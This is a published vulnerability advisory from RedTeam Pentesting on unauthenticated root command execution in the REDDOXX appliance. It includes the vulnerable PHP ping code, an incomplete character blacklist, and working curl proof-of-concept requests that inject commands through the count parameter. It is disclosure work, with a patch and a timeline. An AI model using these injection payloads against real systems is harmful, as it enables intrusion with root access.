@@ -1,0 +1,187 @@
+Advisory: Remote Command Execution as root in REDDOXX Appliance
+
+RedTeam Pentesting discovered a remote command execution vulnerability
+in the REDDOXX appliance software, which allows attackers to execute
+arbitrary command with root privileges while unauthenticated.
+
+Details
+=======
+
+Product: REDDOXX Appliance
+Affected Versions: <= Build 2032 / v2.0.625
+Fixed Versions: Version 2032 SP2
+Vulnerability Type: Remote Command Execution
+Security Risk: high
+Vendor URL: https://www.reddoxx.com/
+Vendor Status: patch available
+Advisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2017-009
+Advisory Status: published
+CVE: GENERIC-MAP-NOMATCH
+CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=GENERIC-MAP-NOMATCH
+
+Introduction
+============
+
+"REDDOXX is a leading supplier of solutions for e-mail archiving,
+encrypted and digitally signed e-mail traffic as well as spam
+protection. Our focus is on technological innovation: taking our cue
+from our clientsâ?? requirements our competent and quality-conscious
+employees strive to offer you the best possible products at all times.
+Using stringent quality standards and proven processes we keep
+developing our company and products continuously, with the goal of
+continuous improvement."
+
+(from the vendor's homepage)
+
+More Details
+============
+
+The administrative interface of the REDDOXX appliance [0] offers several
+diagnostic tools in the "Diagnostic Center". Ping is one of these tools.
+The interface for this tool contains two input fields, which allow users
+to specify a target host and a packet count. Through the ISO provided on
+the vendor's homepage [1], it was possible to analyze how these commands
+are embedded into the command-line of the ping command:
+
+------------------------------------------------------------------------
+
+function ExecuteDiag($parameter)
+{
+// Here we do the main thing ...
+$cmd = "ping '" . $parameter->targetHost . "' -c " . $parameter->count;
+
+$this->PrintHeader();
+$this->PrintHeadLine(array('Result Message', 'Status'));
+$this->PrintOut("<tr>");
+
+$this->PrintOut("<td class=mytd><PRE>");
+passthru($cmd, $rc);
+$this->PrintOut("</PRE></td>");
+
+$this->PrintStatus($rc);
+$this->PrintOut("</tr>");
+$this->PrintEnd();
+
+$result = new stdClass;
+$result->ResultCode = $rc;
+$result->MessageText = "";
+
+$this->SaveResult($result);
+}
+------------------------------------------------------------------------
+
+As can be seen in the listing above, the parameters are embedded into a
+string stored in the variable $cmd. The target host parameter is
+surrounded with single quotes, while the count parameter is not.
+
+Before the parameters are actually embedded into the ping command-line
+however, the following function performs a check for "illegal
+characters":
+
+------------------------------------------------------------------------
+
+public static function CheckShellParameter($parameter, $key = "")
+{
+if (!is_array($parameter))
+$parameter = array($parameter);
+
+foreach ($parameter as $value) {
+if (preg_match("/[';<>\"]/", $value)) {
+$paramNameMsg = "";
+if ($key)
+$paramNameMsg = " in parameter '$key'";
+throw new Exception("Invalid value" . $paramNameMsg . ". Illegal characters found.", 1);
+}
+}
+}
+------------------------------------------------------------------------
+
+These are characters, which can be used to append additional commands to
+the command line. While this check prevents certain kinds of attacks, it
+is incomplete and can therefore be bypassed. For example, && (AND) and
+|| (OR) operators can still be used to append additional commands to the
+command-line. Submitting a count target host of "127.0.0.1" and a count
+of "1 || id" leads to the following command-line being passed to the PHP
+passthru() function and executed:
+
+------------------------------------------------------------------------
+
+ping '127.0.0.1' -c 1 || id
+------------------------------------------------------------------------
+
+This causes the command "id" to be executed after the execution of the
+ping command is completed.
+
+Proof of Concept
+================
+
+The following curl command-lines can be used to trigger the
+vulnerability.
+
+First, the diagnose function ping is called as follows:
+
+------------------------------------------------------------------------
+
+$ curl -H 'Content-Type: application/json' --data '{"Name":"Ping",''"Parameter":{"targetHost":"127.0.0.1","count":"1''&& echo 'REDTEAM_MARKER_START' && id && echo 'REDTEAM_MARKER_END'"}}' http://www.example.com/api/v1/rws/diagnose/start
+------------------------------------------------------------------------
+
+Here, the count parameter "1 && echo 'REDTEAM_MARKER_START' && id && echo
+'REDTEAM_MARKER_END'" is submitted. The two echo commands with markers are
+only used to distinguish the output of the "id" command in the final
+result, which can be retrieved and displayed using the following curl
+command-line:
+
+------------------------------------------------------------------------
+
+$ curl --silent -H 'Accept: application/json' http://www.example.com/api/v1/rws/diagnose/result/Ping | jq .Output | sed 's;.*REDTEAM_MARKER_START\\n\(.*\)\\nREDTEAM_MARKER_END.*;\1;' | sed 's/\\n/\n/g'
+uid=0(root) gid=0(root) groups=0(root)
+------------------------------------------------------------------------
+
+Workaround
+==========
+
+None
+
+Fix
+===
+
+Update the appliance software to Version 2032 SP2.
+
+Security Risk
+=============
+
+The diagnostic functions offered by the REDDOXX appliance allow attackers
+to execute arbitrary commands. Since the commands are executed with root
+privileges and no authentication is required, this is rated as a high
+risk.
+
+Timeline
+========
+
+2017-05-17 Vulnerability identified
+2017-05-23 Customer approved disclosure of vulnerability
+2017-05-26 Customer provided details of vulnerability to vendor
+2017-07-20 Vulnerability reported as fixed by vendor
+2017-07-24 Advisory released
+
+References
+==========
+
+[0] https://www.reddoxx.com/en/
+[1] https://my.reddoxx.com/documents/manual/en/custdl/product-downloads
+(Requires login)
+
+RedTeam Pentesting GmbH
+=======================
+
+RedTeam Pentesting offers individual penetration tests performed by a
+team of specialised IT-security experts. Hereby, security weaknesses in
+company networks or products are uncovered and can be fixed immediately.
+
+As there are only few experts in this field, RedTeam Pentesting wants to
+share its knowledge and enhance the public knowledge with research in
+security-related areas. The results are made available as public
+security advisories.
+
+More information about RedTeam Pentesting can be found at:
+https://www.redteam-pentesting.de/
